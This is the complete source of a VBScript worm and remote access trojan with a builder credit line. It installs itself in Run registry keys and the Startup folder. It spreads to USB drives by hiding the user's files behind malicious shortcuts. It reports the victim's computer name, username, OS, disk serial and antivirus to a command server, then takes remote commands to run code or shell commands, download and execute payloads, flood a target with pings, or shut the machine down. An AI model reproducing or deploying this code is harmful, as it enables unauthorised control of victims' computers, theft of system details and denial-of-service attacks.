on error resume next

'#################################################################

'<[ Recoder : Security.Najaf (c) skype : Security.Najaf ]>

'<[ Credits : NjQ8 and Mr.Hacker ]>

'<[ Thanks For : JoHn.Dz ]>

'#################################################################

' \\ Configuration ~
'-----------------------------------------
dim shell
set shell = WScript.CreateObject("WSCRIPT.SHELL")
dim fs
set fs = WScript.CreateObject("Scripting.filesystemobject")
dim installname
installname = "SecurityNajaf.vbs"
dim dir
dir = "Temp" 
path = shell.ExpandEnvironmentStrings("%" & dir & "%") & "\"
dim spl
spl="|SE-NAJAF|"
dim http
set http = CreateObject("MICROSOFT.XMLHTTP")
dim host 
host = "127.0.0.1"
dim port
port = "1144" 
dim name 
name = "SECURITY 2014"
dim startup
startup = shell.specialfolders ("startup") & "\"
dim response
dim i
i = 0
dim y 
y = 0
dim oneonce
dim cmd
dim usb
usb= shell.regread("HKCU\Windowsshell")
if usb="" then
if lcase( mid(wscript.scriptfullname,2))=":\" &  lcase(installname) then
usb="TRUE"
shell.regwrite "HKCU\Windowsshell",  usb, "REG_SZ"
else
usb="FALSE"
shell.regwrite "HKCU\Windowsshell",  usb, "REG_SZ"

end if
end if
Err.Clear

' \\ Settings ~
'-----------------------------------------
install
xinstall
while true
cmd = ""
cmd  = Send ("READY","")
response = split(cmd,spl)
select case response(0)
Case "uninstall"
uninstall
case "RE"
shell.run WScript.SCRIPTFULLNAME ,7
WScript.Quit
case "download"
download response(1),path & response(2)
case "update"
oneonce.close
set oneonce =  fs.opentextfile (path & installname ,2, false)
oneonce.write response(1)
oneonce.close
shell.run "wscript.exe //B " & chr(34) & path & installname & chr(34),7
wscript.quit 
case "execute"
execute response(1)
case "cmd"
shell.run "%comspec%" & response(1),7
case "Attack"
shell.run "%comspec%" & " /c ping " & response(1) & " -l " & response(2) & " -t",7
case "ourl"
shell.run "%comspec% " & " /c start " & response(1),7
case "close"
WScript.Quit
case "shutdown"
shell.run "%comspec%" & " /c shutdown /s /t " & response(1),7
case "restart"
shell.run "%comspec%" & " /c shutdown /r /t " & response(1),7
case "logoff"
shell.run "%comspec%" & " /c shutdown /l /t " & response(1),7
end select
WSCRIPT.SLEEP 2000
i = i + 1
if i> 2 then
i=0
xinstall
end if

wend

' \\ Sub and Function ~
'-----------------------------------------
function Send(cmd,data)
Send = ""
http.open "POST","http://" & host & ":" & port &"/" & cmd, false
http.setRequestHeader "User-Agent:",  userinfo
http.send data
Send = http.responseText
end function
function userinfo
on error resume next
if userinfo = "" then
x = "XDZX"
userinfo = x & " startinfo" & spl & name & hwid &  spl &  OS & spl  & computer & spl & username &spl &  security & spl &  usb  & spl &  "1.2" &spl &  x 
end if
end Function
function computer
computer = shell.expandenvironmentstrings("%computername%")
end function
function username
username = shell.expandenvironmentstrings("%username%")
end function
function hwid
on error resume next
set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
set disks = root.execquery ("select * from win32_logicaldisk")
for each disk in disks
if  disk.volumeserialnumber <> "" then
hwid = disk.volumeserialnumber
exit for
end if
next
End function
function security 
on error resume next
security = ""
set objwmiservice = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
set colitems = objwmiservice.execquery("select * from win32_operatingsystem",,48)
for each objitem in colitems
versionstr = split (objitem.version,".")
next
versionstr = split (colitems.version,".")
osversion = versionstr (0) & "."
for  x = 1 to ubound (versionstr)
osversion = osversion &  versionstr (i)
next
osversion = eval (osversion)
if  osversion > 6 then sc = "securitycenter2" else sc = "securitycenter"
set objsecuritycenter = getobject("winmgmts:\\localhost\root\" & sc)
Set colantivirus = objsecuritycenter.execquery("select * from antivirusproduct","wql",0)
for each objantivirus in colantivirus
security  = security  & objantivirus.displayname & " ."
next
if security  = "" then security  = "Not Found"
end function
Function OS
Set a = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Set aa = a.ExecQuery ("Select * from Win32_OperatingSystem")
For Each aaa in aa
s= aaa.Caption  
next
OS = s
End Function
sub xinstall
On Error resume next
for each xx in fs.Drives
if xx.isready then
if xx.FreeSpace >0 then
if xx.drivetype=1 then
if fs.fileexists(xx.path & "\" & installname) then
fs.getfile(xx.path & "\"  & installname).Attributes=0
end if
fs.copyfile path & installname , xx.path & "\"  & installname,true
For Each x In fs.GetFolder( xx.path & "\" ).Files
wscript.sleep 1
if instr(x.name,".") then
if lcase( Split(x.name, ".")(UBound(Split(x.name, "."))))<>"lnk" then
x.Attributes = 2+4
if ucase(x.name) <> ucase(installname) then
With shell.CreateShortcut(xx.path & "\"  & x.name & ".lnk") 
.TargetPath = "cmd.exe"
.WorkingDirectory = ""
.WindowStyle = 7
.Arguments = "/c start " & Replace(installname," ", ChrW(34) _
& " " & ChrW(34)) & "&start " & replace( x.name," ", ChrW(34) & " " & ChrW(34)) & " & exit"
.IconLocation = shell.regread("HKLM\SOFTWARE\Classes\" & shell.regread("HKLM\SOFTWARE\Classes\." & Split(x.name, ".")(UBound(Split(x.name, "."))) & "\") & "\DefaultIcon\")
if instr( .iconlocation,",")=0 then
.iconlocation = .iconlocation &",0"
end if
.Save()
end with
end if
end if
end if
Next
end if
end if
end if
next
Err.Clear
end sub
sub install ()
on error resume Next
shell.regwrite "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split (installname,".")(0),  "wscript.exe //B " & chrw(34) & installdir & installname & chrw(34) , "REG_SZ"
shell.regwrite "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" & split (installname,".")(0),  "wscript.exe //B "  & chrw(34) & installdir & installname & chrw(34) , "REG_SZ"
fs.copyfile wscript.scriptfullname,installdir & path,true
fs.copyfile wscript.scriptfullname,startup & installname ,true
end sub
sub uninstall
on error resume next
dim filename
shell.regdelete "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split (installname,".")(0)
shell.regdelete "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" & split (installname,".")(0)
fs.deletefile startup & installname ,true
fs.deletefile wscript.scriptfullname ,true
for  each drive In fs.drives
if  drive.isready = true then
if  drive.freespace  > 0 then
if  drive.drivetype  = 1 then
for  each file in fs.getfolder ( drive.path & "\").files
on error resume next
if  instr (file.name,".") then
if  lcase (split(file.name, ".")(ubound(split(file.name, ".")))) <> "lnk" then
file.attributes = 0
if  ucase (file.name) <> ucase (installname) then
filename = split(file.name,".")
fs.deletefile (drive.path & "\" & filename(0) & ".lnk" )
else
fs.deletefile (drive.path & "\" & file.name)
end if
end if
end if
next
end if
end if
end if
next
wscript.quit
end sub
sub download (fileurl,filename)
strlink = fileurl
strsaveto = installdir & filename
set objhttpdownload = createobject("msxml2.xmlhttp" )
objhttpdownload.open "get", strlink, false
objhttpdownload.send
set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
objfsodownload.deletefile (strsaveto)
end if
if objhttpdownload.status = 200 then
dim  objstreamdownload
set  objstreamdownload = createobject("adodb.stream")
with objstreamdownload
.type = 1 
.open
.write objhttpdownload.responsebody
.savetofile strsaveto
.close
end with
set objstreamdownload = nothing
end if
if objfsodownload.fileexists(strsaveto) then
shell.run objfsodownload.getfile (strsaveto).shortpath
end if 
end sub
